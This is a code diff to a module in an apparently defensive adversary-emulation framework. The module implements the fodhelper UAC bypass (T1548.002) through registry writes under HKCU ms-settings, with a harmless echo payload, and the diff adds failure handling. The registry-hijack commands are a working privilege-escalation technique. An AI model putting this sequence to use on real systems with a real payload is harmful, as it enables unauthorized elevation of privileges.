@@ -4,7 +4,7 @@ import logging
 from typing import Any
 
 from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
-from purplestrike.techniques.connection import TargetConnection, get_connection
+from purplestrike.techniques.connection import TargetConnection, command_error, get_connection
 
 logger = logging.getLogger(__name__)
 
@@ -16,32 +16,50 @@ async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
         method = parameters.get("method", "fodhelper")
         conn = await get_connection(target)
         if method == "fodhelper":
-            await conn.run_ps(
+            setup_results = []
+            setup_results.append(await conn.run_ps(
                 "New-Item -Path 'HKCU:\\Software\\Classes\\ms-settings'"
                 " -Force | Out-Null"
-            )
-            await conn.run_ps(
+            ))
+            setup_results.append(await conn.run_ps(
                 "New-Item -Path "
                 "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
                 " -Force | Out-Null"
-            )
-            await conn.run_ps(
+            ))
+            setup_results.append(await conn.run_ps(
                 "New-ItemProperty -Path "
                 "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
                 " -Name 'DelegateExecute' -Value '' -PropertyType String "
                 "-Force | Out-Null"
-            )
-            await conn.run_ps(
+            ))
+            setup_results.append(await conn.run_ps(
                 "New-ItemProperty -Path "
                 "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command'"
                 " -Name '(Default)' -Value 'cmd.exe /c echo UAC_BYPASS_TEST' "
                 "-PropertyType String -Force | Out-Null"
-            )
+            ))
+            failed = next((result for result in setup_results if not result.success), None)
+            if failed is not None:
+                return TechniqueResult(
+                    technique_id="T1548.002",
+                    success=False,
+                    output=failed.stdout[:4096],
+                    error=command_error(failed)[:1024],
+                    execution_status=ExecutionStatus.FAILURE,
+                )
             verify = await conn.run_ps(
                 "Get-ItemProperty -Path "
                 "'HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command' "
                 "| Format-List"
             )
+            if not verify.success:
+                return TechniqueResult(
+                    technique_id="T1548.002",
+                    success=False,
+                    output=verify.stdout[:4096],
+                    error=command_error(verify)[:1024],
+                    execution_status=ExecutionStatus.FAILURE,
+                )
             return TechniqueResult(
                 technique_id="T1548.002",
                 success=True,
